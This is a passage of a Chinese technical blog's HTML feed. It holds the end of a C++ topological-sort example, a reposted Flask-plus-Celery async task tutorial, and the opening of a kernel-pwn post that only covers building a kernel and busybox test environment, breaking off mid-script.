class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 26</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> adjvex;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArcNode</span> *<span class="title">nextarc</span>;</span></span><br><span class="line">ArcNode() &#123;</span><br><span class="line">nextarc = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; ArcNode; <span class="comment">//结点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">VNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line">ArcNode *firstarc;</span><br><span class="line">VNode() &#123;</span><br><span class="line">firstarc = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; VNode, AdjList[MAX_VERTEX_NUM];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">AdjList vertices;</span><br><span class="line"><span class="type">int</span> vexnum, arcnum;</span><br><span class="line">&#125; ALGraph;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">TopologicalSort</span><span class="params">(ALGraph G, <span class="type">int</span> *indegree)</span> &#123;</span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="type">int</span>&gt; s;<span class="comment">//初始化栈</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i, k;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; G.vexnum + <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (!indegree[i])</span><br><span class="line">s.push(i); <span class="comment">//入度为0的顶点入栈</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;<span class="comment">//记录当前已经输出的顶点数</span></span><br><span class="line">ArcNode *p;</span><br><span class="line"><span class="keyword">while</span> (!s.empty()) &#123;</span><br><span class="line">i = s.top();</span><br><span class="line">s.pop();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; G.vertices[i].data &lt;&lt; <span class="string">&quot;-&gt;&quot;</span>;</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">for</span> (p = G.vertices[i].firstarc; p; p = p-&gt;nextarc) &#123;</span><br><span class="line">k = p-&gt;adjvex;</span><br><span class="line">indegree[k]--; <span class="comment">//将所有指向i的顶点的入度减一，并且将入度为0的顶点压入栈s</span></span><br><span class="line"><span class="keyword">if</span> (!indegree[k])</span><br><span class="line">s.push(k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (count &lt; G.vexnum)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">ALGraph g;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;载入图中...&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">ifstream <span class="title function_">fin</span><span class="params">(<span class="string">&quot;in.txt&quot;</span>)</span>;</span><br><span class="line">fin &gt;&gt; g.vexnum &gt;&gt; g.arcnum;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; g.vexnum + <span class="number">1</span>; i++)</span><br><span class="line">g.vertices[i].data = i;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> b, e;</span><br><span class="line">ArcNode *p;</span><br><span class="line"><span class="type">int</span> *indegree = new <span class="type">int</span>[g.vexnum + <span class="number">1</span>];</span><br><span class="line"><span class="comment">//注意 int *a=new int(n);  申请一个整型变量空间，赋初值为n，并定义一个整型指针a指向该地址空间</span></span><br><span class="line"><span class="comment">//int *indegree=(int *)malloc(sizeof(int)*(g.vexnum+1));</span></span><br><span class="line"><span class="built_in">memset</span>(indegree, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>) * (g.vexnum + <span class="number">1</span>));</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; g.arcnum + <span class="number">1</span>; i++) &#123;</span><br><span class="line">fin &gt;&gt; b &gt;&gt; e;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;第&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;条边：&quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;-&gt;&quot;</span> &lt;&lt; e &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">p = new ArcNode();</span><br><span class="line">p-&gt;adjvex = e;</span><br><span class="line">p-&gt;nextarc = g.vertices[b].firstarc;</span><br><span class="line">g.vertices[b].firstarc = p;</span><br><span class="line">indegree[e]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (TopologicalSort(g, indegree))</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;正常完成！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;该有向图有回路！&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试数据，新建 in.txt 文件输入内容</p><blockquote><p>1）有环<br> 4 4<br>1 2<br>2 3<br>3 4<br>4 2</p></blockquote><blockquote><p>2）无环<br> 12 16<br>1 2<br>1 3<br>2 3<br>1 4<br>3 5<br>4 5<br>11 6<br>5 7<br>3 7<br>3 8<br>6 8<br>9 10<br>9 11<br>9 12<br>10 12<br>1 12</p></blockquote><p>结果:<br><img src="https://img-blog.csdnimg.cn/0e6f89b0f60c414f82b79bc6716940c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2d977aa607744bd181fc042e13f2ce20.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><a href="https://blog.csdn.net/ywcpig/article/details/52599867?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164448334116780264052450%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164448334116780264052450&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-52599867.first_rank_v2_pc_rank_v29&amp;utm_term=%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8Fc%2B%2B&amp;spm=1018.2226.3001.4187">参考文章</a><br><a href="https://cloud.tencent.com/developer/article/1569368"> https://cloud.tencent.com/developer/article/1569368</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask配置celery异步任务</title>
      <link href="/2022/02/13/flask%E9%85%8D%E7%BD%AE%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1/"/>
      <url>/2022/02/13/flask%E9%85%8D%E7%BD%AE%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>flask 配置 celery 异步任务</p><span id="more"></span><h3 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言<a href="https://www.cnblogs.com/wxhou/p/14399237.html#%E5%89%8D%E8%A8%80">#</a></h3><blockquote><p>转载自：<a href="https://www.cnblogs.com/wxhou/p/14399237.html">https://www.cnblogs.com/wxhou/p/14399237.html</a></p></blockquote><p>在使用 flask 开发的时候，接口的返回需要很少的时间，所以我们需要将一些耗时的任务，放到异步后台去处理，例如：发送邮件，耗时的 CPU 任务等。在 python web 框架中 celery 这个库，可能是最合适的。</p><p>由于我使用 flask 的时间比较多，但是当我想把 celery 很好的与 flask 进行集成的时候，却发现并不是那么如意。花费了很久的时间去实践最后却是各种报错。出现了循环导入、app 上下文、tasks not found 等问题，尝试了种种却总是不如人意。</p><p>好在功夫不负有心人，在结合官方文档并查阅了大量资料后，终于把 celery 很好得集成在了 flask 项目中。我在这里记录一下，同时也希望对你们有所帮助。</p><h3 id="配置"><a class="markdownIt-Anchor" href="#配置">#</a> 配置<a href="https://www.cnblogs.com/wxhou/p/14399237.html#%E9%85%8D%E7%BD%AE">#</a></h3><table><thead><tr><th>开发环境</th><th>Windows10</th></tr></thead><tbody><tr><td>python</td><td>3.8.6</td></tr><tr><td>flask</td><td>2.0.x</td></tr><tr><td>celery</td><td>5.x</td></tr><tr><td>broker</td><td>redis</td></tr><tr><td>pool</td><td>eventlet</td></tr></tbody></table><h3 id="simple模式"><a class="markdownIt-Anchor" href="#simple模式">#</a> simple 模式<a href="https://www.cnblogs.com/wxhou/p/14399237.html#simple%E6%A8%A1%E5%BC%8F">#</a></h3><p>由于 celery 5.0 后推荐小写模式，与 flask config 大写规范有冲突，所以我们当同目录下创建一个 <code>celeryconfig.py</code>  文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">celeryconfig.py</span><br><span class="line">broker_url=&#x27;redis://127.0.0.1:6379/1&#x27;</span><br><span class="line">result_backend=&#x27;redis://127.0.0.1:6379/2&#x27;</span><br></pre></td></tr></table></figure><p>flask simple 模式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">simple.py</span><br><span class="line">from flask import Flask</span><br><span class="line">from celery import Celery</span><br><span class="line">import celeryconfig</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">celery_app = Celery(app.import_name,</span><br><span class="line">                    broker=celeryconfig.broker_url,</span><br><span class="line">                    backend=celeryconfig.result_backend)</span><br><span class="line">celery_app.config_from_object(celeryconfig)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@celery_app.task(name=&#x27;simple/add2&#x27;)</span><br><span class="line">def add2(x, y):</span><br><span class="line">    return x + y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    results = add2.delay(3, 5)</span><br><span class="line">    return str(results.wait())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure><p>这些就是单文件模式的代码，这其中我们添加了一个任务 <code>add2</code> ，然后启动 flask。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python simple.py</span><br></pre></td></tr></table></figure><p>由于 celery 和 flask 是同级别的 app，所以我们需要一个新的窗口启动 celery，加入 - P 参数指定异步 worker <code>eventlet</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">celery -A simple.celery_app worker -l info -P eventlet</span><br></pre></td></tr></table></figure><p>当我们启动 celery 之后。看到最后一行的 ready 的时候，说明我们的 celery 已经启动成功了。</p><p>然后再看有下面标识说明我们的任务已经被添加成功了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[tasks]</span><br><span class="line">  . simple/add2</span><br></pre></td></tr></table></figure><p>访问网址：<a href="http://127.0.0.1:5000/">http://127.0.0.1:5000/</a></p><p><a href="https://i.loli.net/2021/02/11/Ra9sxpLWX4VoyMm.png"><img src="https://i.loli.net/2021/02/11/Ra9sxpLWX4VoyMm.png" alt="image-20210211174559291"></a></p><p>同时我们查看一下 celery 的窗口：</p><p><a href="https://i.loli.net/2021/02/11/n6HB8XSlOT5uRmM.png"><img src="https://i.loli.net/2021/02/11/n6HB8XSlOT5uRmM.png" alt="image-20210211174707759"></a></p><p>simple 模式就结束了</p><h3 id="factory模式"><a class="markdownIt-Anchor" href="#factory模式">#</a> Factory 模式<a href="https://www.cnblogs.com/wxhou/p/14399237.html#factory%E6%A8%A1%E5%BC%8F">#</a></h3><p>当然我们如果用 flask 写一个稍微复杂的东西的话，其实工厂模式我们应该用的更多。下面我们一起来看看工厂模式中的配置。</p><h4 id="目录结构"><a class="markdownIt-Anchor" href="#目录结构">#</a> 目录结构<a href="https://www.cnblogs.com/wxhou/p/14399237.html#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84">#</a></h4><p>首先我们先规划一个 flask+celery 的目录结构。然后创建下面的文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── app</span><br><span class="line">│   ├── __init__.py  ——app主体文件</span><br><span class="line">│   ├── celeryconfig.py           ——celery配置文件</span><br><span class="line">│   ├── config.py  ——flask配置文件</span><br><span class="line">│   ├── models.py  ——模型文件</span><br><span class="line">│   ├── tasks.py  ——后台任务</span><br><span class="line">│   └── views.py  ——视图文件</span><br><span class="line">├── data.db</span><br><span class="line">├── .flaskenv      ——flask环境变量</span><br><span class="line">└── server.py  ——运行文件</span><br></pre></td></tr></table></figure><p>我们先创建一个注册 celery 的函数，主要功能是使用 flask 应用上下文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">register_celery</span>(<span class="params">celery, app</span>):</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ContextTask</span>(celery.Task):</span><br><span class="line">        abstract = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">            <span class="keyword">with</span> app.app_context():</span><br><span class="line">                <span class="keyword">return</span> self.run(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    celery.Task = ContextTask</span><br></pre></td></tr></table></figure><p>然后我们创建 create_app 函数，将写好的注册 celery 函数加进去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_app</span>(<span class="params">**kwargs</span>):</span><br><span class="line">    app = Flask(__name__)</span><br><span class="line">    app.config.from_pyfile(<span class="string">&#x27;config.py&#x27;</span>)</span><br><span class="line">    db.init_app(app)</span><br><span class="line">    register_celery(celery=kwargs.get(<span class="string">&#x27;celery&#x27;</span>), app=app)  <span class="comment"># &gt;&gt; 注册celery</span></span><br><span class="line">    register_blueprints(app) </span><br><span class="line">    register_commands(app)</span><br><span class="line">    <span class="keyword">return</span> app</span><br></pre></td></tr></table></figure><p>上面这些都是我们在 <code>__init__</code> 文件中创建的，下面我们来创建 celery 的 app</p><p><a href="http://xn--server-oi2ls3t.py">打开 server.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> create_app, celeryconfig</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_celery</span>(<span class="params">app_name</span>):</span><br><span class="line">    celery = Celery(app_name,</span><br><span class="line">                    broker=celeryconfig.broker_url,</span><br><span class="line">                    backend=celeryconfig.result_backend)</span><br><span class="line">    celery.config_from_object(celeryconfig)</span><br><span class="line">    <span class="keyword">return</span> celery</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_celery = make_celery(__name__)</span><br><span class="line"></span><br><span class="line">app = create_app(celery=my_celery)</span><br></pre></td></tr></table></figure><p>我们把 celery 配置文件和 flask 工厂应用导入进来。然后创建 make_celery 函数生成 celery 应用。</p><p>生成 celery 应用后把 celery 传入到 flask 应用函数中去。这样把<strong>生成</strong>和<strong>注册</strong>分开写，解决了循环导入的问题。</p><p>接着我们创建一个 tasks.py 文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> server <span class="keyword">import</span> my_celery</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> db, Message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@my_celery.task()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">msg</span>):</span><br><span class="line">    message = Message(details=msg)</span><br><span class="line">    db.session.add(message)</span><br><span class="line">    db.session.commit()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br></pre></td></tr></table></figure><p>从 server 文件中导入 celery 应用，然后创建任务。</p><p>然后在视图中引用任务。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, jsonify</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> db, Message</span><br><span class="line"><span class="keyword">from</span> .tasks <span class="keyword">import</span> add2</span><br><span class="line"></span><br><span class="line">th = Blueprint(<span class="string">&#x27;&#x27;</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@th.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    res = add2.delay(<span class="string">&quot;hello word&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(res.wait())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@th.get(<span class="params"><span class="string">&#x27;/msgs&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">msg_list</span>():</span><br><span class="line">    messages = Message.query.<span class="built_in">all</span>()</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> message <span class="keyword">in</span> messages:</span><br><span class="line">        results.append(message.to_json())</span><br><span class="line">    <span class="keyword">return</span> jsonify(results)</span><br></pre></td></tr></table></figure><p>celery 的任务可以通过 delay， 方法调用，参数在 delay 中直接传入。</p><p>详细介绍：</p><h4 id="celery文档"><a class="markdownIt-Anchor" href="#celery文档">#</a> celery 文档<a href="https://www.cnblogs.com/wxhou/p/14399237.html#celery%E6%96%87%E6%A1%A3">#</a></h4><p>这些 API 定义了标准的执行选项集，也就是下面这三个方法：</p><ul><li><p>apply_async(args[, kwargs[, …]])</p><p>发送一个任务消息。</p></li><li><p>delay(*args, **kwargs)</p><p>直接发送一个任务消息，但是不支持运行参数。</p></li><li><p>calling( <code>__call__</code> )</p><p>应用一个支持调用接口（例如，add (2,2)）的对象，意味着任务不会被一个 worker 执行，但是会在当前线程中执行 (但是消息不会被发送)。</p></li></ul><p><strong>速查表</strong></p><ul><li><p><code>T.delay(arg, kwarg=value)</code></p><p>调用 apply_async 的快捷方式（.delay (_args, *_kwargs) 等价于调用 .apply_async (args, kwargs)）。</p></li><li><p><code>T.apply_async((arg,), &#123;'kwarg': value&#125;)</code></p></li><li><p><code>T.apply_async(countdown=10)</code></p><p>从现在起，十秒内执行。</p></li><li><p><code>T.apply_async(eta=now + timedelta(seconds=10))</code></p><p>从现在起十秒内执行，指明使用 eta。</p></li><li><p><code>T.apply_async(countdown=60, expires=120)</code></p><p>从现在起一分钟执行，但在两分钟后过期。</p></li><li><p><code>T.apply_async(expires=now + timedelta(days=2))</code></p><p>两天内过期，使用 datetime 对象。</p></li></ul><p>例子</p><p><code>delay()</code>  方法就像一个很规则的函数，很方便去调用它：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">task.delay(arg1, arg2, kwarg1=<span class="string">&#x27;x&#x27;</span>, kwarg2=<span class="string">&#x27;y&#x27;</span>)</span><br></pre></td></tr></table></figure><p>用  <code>apply_async()</code>  替代你写的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">task.apply_async(args=[arg1, arg2], kwargs=&#123;<span class="string">&#x27;kwarg1&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;kwarg2&#x27;</span>: <span class="string">&#x27;y&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>尽管运行十分方便，但是如果像设置额外的行参数，你必须用  <code>apply_async</code></p><h4 id="运行一下"><a class="markdownIt-Anchor" href="#运行一下">#</a> 运行一下<a href="https://www.cnblogs.com/wxhou/p/14399237.html#%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%8B">#</a></h4><p>运行之前我们需要先创建一个 <code>.flaskenv</code>  文件，指定以下我们的 FLASK_APP 环境变量是 server.py</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLASK_APP=server.py</span><br></pre></td></tr></table></figure><p>好了之后，启动 flask</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask run</span><br></pre></td></tr></table></figure><p>启动 celery</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">celery -A server.my_celery worker -l info -P eventlet</span><br></pre></td></tr></table></figure><p>老规矩，看一下任务注册成功没</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[tasks]</span><br><span class="line">  . app.tasks.add2</span><br></pre></td></tr></table></figure><p>我们打开浏览器查看</p><p><a href="https://i.loli.net/2021/08/21/wryXGlcC1kn58Vh.png"><img src="https://i.loli.net/2021/08/21/wryXGlcC1kn58Vh.png" alt="image"></a></p><p>可以看到执行成功了。再看看命令行。</p><p><a href="https://i.loli.net/2021/08/21/8FDZyo3A41UaVbR.png"><img src="https://i.loli.net/2021/08/21/8FDZyo3A41UaVbR.png" alt="image-20210821235926547"></a></p><p>任务已经成功的执行了。</p><p>就这样我们弄好了 flask+celery 项目的配置，并成功执行了任务。</p><p>（待补充 django+celery)</p>]]></content>
      
      
      <categories>
          
          <category> flask </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Pwn 学习（一）</title>
      <link href="/2022/02/09/Kernel%20Pwn%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2022/02/09/Kernel%20Pwn%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>kernel pwn 环境搭建</p><span id="more"></span><h2 id="编译内核"><a class="markdownIt-Anchor" href="#编译内核">#</a> 编译内核</h2><p>首先到 linux 内核<a href="https://www.kernel.org/">官网</a>下载一份内核源代码并解压</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202092301097.png" alt="image-20220209230147843"></p><p>选择一个版本下载，我选的是 4.9 [tallball]，</p><p>之后安装需要的依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc</span><br></pre></td></tr></table></figure><p>解压源码后进入内核目录，输入命令 sudo make menuconfig 进入内核设置</p><p><img src="https://n0va-scy.github.io/images/%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.jpg" alt="img"></p><p>进入 kernel hacking，检查保证勾选了以下选项 (其实默认都是勾选的，只是进去看一眼而已)</p><ul><li>Kernel debugging</li><li>Compile-time checks and compiler options —&gt; Compile the kernel with debug info 和 Compile the kernel with frame pointers</li><li>KGDB: kernel debugger</li></ul><p>保存并退出</p><p><code>sudo make bzImage</code>  生成 bzImage，过程挺久的，完成后在 boot 下生成了一个 bzImage 文件</p><blockquote><p>注:</p><p>在过程中可能报错 <code>没有规则可制作目标debian/certs/debian-uefi-certs.pem由certs/x509_certificate_list需求停止</code></p><p>解决方法：在主目录 /usr/src/linux… 中修改.config 文件，去掉上述内容（如果还是不行就修改 linux.4.9 中的.config 对应部分为空<img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202202092308620.png" alt="image-20220209230842570"></p><p>重新编译即可</p></blockquote><h2 id="编译busybox构建文件系统"><a class="markdownIt-Anchor" href="#编译busybox构建文件系统">#</a> 编译 busybox 构建文件系统</h2><p>在<a href="https://busybox.net/"> busybox 官网</a>下载 busybox 文件，最新版的就行</p><p>解压后进入目录， <code>make menuconfig</code> ，同样会进入图形界面，在 Settings 上勾选 Build static binary (no shared libs), 然后保存退出</p><p>编译，执行 <code>make install</code> ，根目录下会生成一个 <code>_install</code>  文件夹，进入文件夹配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd _install</span><br><span class="line">mkdir proc</span><br><span class="line">mkdir sys</span><br><span class="line">touch init</span><br><span class="line">touch packet</span><br><span class="line">chmod +x init</span><br></pre></td></tr></table></figure><p>编辑 init 文件，用于内核初始化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;&#123;==DBG==&#125; INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">#mount指令 挂载某个分区到某个文件，这样就将分区与文件建立联系从而访问文件时就可以访问分区。</span><br><span class="line"># insmod /xxx.ko # 加载模块</span><br><span class="line"># insmod /hello.ko # 加载hello.ko模块</span><br><span class="line">mdev -s </span><br><span class="line"># We need this to find /dev/sda later</span><br><span class="line">echo -e &quot;&#123;==DBG==&#125; Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid 